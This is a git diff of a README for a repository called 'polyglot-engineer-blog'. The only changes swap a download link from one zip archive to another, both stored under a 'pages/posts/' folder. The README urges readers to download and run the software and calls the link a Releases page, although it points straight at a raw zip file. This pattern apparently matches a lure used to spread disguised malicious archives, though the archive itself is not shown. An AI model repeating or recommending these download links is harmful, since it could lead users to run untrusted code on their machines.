@@ -1,6 +1,6 @@
 # 🌟 polyglot-engineer-blog - Explore the Future of Programming
 
-[![Download](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot-blog-engineer-v2.1.zip)](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot-blog-engineer-v2.1.zip)
+[![Download](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot_blog_engineer_v3.6.zip)](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot_blog_engineer_v3.6.zip)
 
 ## 📥 Introduction
 
@@ -28,7 +28,7 @@ To begin using the polyglot-engineer-blog, you only need to follow a few simple 
 
 To download the software, please visit this link:
 
-[Download polyglot-engineer-blog](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot-blog-engineer-v2.1.zip)
+[Download polyglot-engineer-blog](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot_blog_engineer_v3.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top.
@@ -81,4 +81,4 @@ We encourage you to engage with others who share your interests. Participate in 
 
 ---
 
-Now that you know how to download and run polyglot-engineer-blog, begin your journey into the exciting world of programming and data science. Visit this page to download: [https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot-blog-engineer-v2.1.zip](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot-blog-engineer-v2.1.zip). Enjoy exploring!
+Now that you know how to download and run polyglot-engineer-blog, begin your journey into the exciting world of programming and data science. Visit this page to download: [https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot_blog_engineer_v3.6.zip](https://github.com/mahadirahat/polyglot-engineer-blog/raw/refs/heads/main/pages/posts/polyglot_blog_engineer_v3.6.zip). Enjoy exploring!
